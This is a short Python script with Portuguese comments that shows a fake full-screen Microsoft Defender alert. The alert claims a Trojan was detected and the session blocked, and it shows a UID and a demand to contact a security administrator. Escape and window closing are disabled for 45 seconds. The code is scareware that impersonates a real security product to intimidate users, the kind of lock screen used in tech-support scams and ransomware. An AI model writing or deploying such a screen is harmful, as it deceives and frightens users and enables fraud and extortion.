import ctypes
import os
import platform
import sys
import time
import threading
from tkinter import Tk, Label, PhotoImage, CENTER

def lock_screen_fake_defender(message="Ameaça detectada", uid="UNKNOWN", duration=60):
    def fullscreen_window():
        window = Tk()
        window.title("Windows Security Alert")
        window.attributes('-fullscreen', True)
        window.configure(bg="black")
        window.bind("<Escape>", lambda e: None)  # Desativa ESC

        # Evita ALT+F4
        window.protocol("WM_DELETE_WINDOW", lambda: None)

        # Texto principal
        label = Label(window, text=f"⚠️ Microsoft Defender bloqueou esta sessão ⚠️\n\n{message}\n\nUID: {uid}",
                      font=("Segoe UI", 22), fg="red", bg="black", justify=CENTER)
        label.pack(expand=True)

        # Subtexto fake
        bottom = Label(window, text="Ameaça detectada: Trojan:Win32/AgentTesla\nProteção em tempo real ativada.\nNão desligue o computador.",
                       font=("Consolas", 14), fg="white", bg="black", justify=CENTER)
        bottom.pack()

        window.after(duration * 1000, window.destroy)  # Fecha após N segundos
        window.mainloop()

    threading.Thread(target=fullscreen_window).start()


def trigger_defender_alert(uid="UNKNOWN"):
    message = "Este computador foi bloqueado por motivos de segurança.\nContato necessário com o administrador de segurança."
    print("[🛡️] Tela falsa do Windows Defender ativada (simulação visual)")
    lock_screen_fake_defender(message=message, uid=uid, duration=45)


if __name__ == "__main__":
    # Execução direta para teste
    test_uid = sys.argv[1] if len(sys.argv) > 1 else "TESTE123"
    trigger_defender_alert(uid=test_uid)
